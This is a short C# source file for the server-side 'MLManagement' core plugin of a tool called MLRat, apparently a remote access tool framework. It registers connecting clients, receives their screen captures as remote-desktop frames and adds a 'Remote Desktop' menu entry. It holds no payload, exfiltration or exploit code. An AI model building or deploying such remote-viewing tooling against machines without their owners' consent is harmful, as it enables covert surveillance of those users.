using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MLRat.Server;
using ServerPlugin.InterfaceHandle;
using System.Drawing;

public class MLManagement_Server : IServerPlugin 
{
    public void OnClientConnect(IClient client)
    {
        RemoteDesktop.newClient(client);
    }

    public void OnClientDisconnect(IClient client)
    {
        RemoteDesktop.ClientDisconnected(client);
    }

    public void OnDataRetrieved(IClient client, object[] data)
    {
        string command = (string)data[0];
        if (command == "remotedesktop")
        {
            Bitmap sc = (Bitmap) data[1];
            RemoteDesktop.NewFrame(client, sc);
        }
    }

    public void OnPluginLoad(IServerUIHandler UIHost)
    {
        UIHost.AddContext(new MLRatContextEntry()
        {
            Text = "Remote Desktop",
            OnClick = RemoteDesktop.ContextCallback
        });
        
    }

    public ServerPlugin.InterfaceHandle.MLPluginInfomation PluginInfomation
    {
        get
        {
            MLPluginInfomation _p = new MLPluginInfomation();
            _p.PluginName = "MLManagement";
            _p.Developer = "BahNahNah";
            _p.Description = "Core plugin";
            return _p;
        }
    }


    
}